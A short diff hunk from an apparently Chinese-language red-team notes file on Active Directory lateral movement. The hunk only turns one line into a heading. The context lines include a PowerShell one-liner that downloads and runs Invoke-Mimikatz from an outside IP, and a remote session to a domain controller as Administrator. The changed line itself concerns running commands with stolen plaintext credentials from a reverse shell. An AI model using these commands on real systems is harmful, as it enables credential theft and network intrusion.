@@ -53,7 +53,7 @@ iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
 Enter-PSSession –Computername dcorp-dc –credential dcorp\Administrator
 ```
 
-下面方法适用于得到了用户明文密码,但不是在RDP环境中（比如反弹shell中），使用这个用户身份执行命令
+# 下面方法适用于得到了用户明文密码,但不是在RDP环境中（比如反弹shell中），使用这个用户身份执行命令
 
 处理密码
 ```
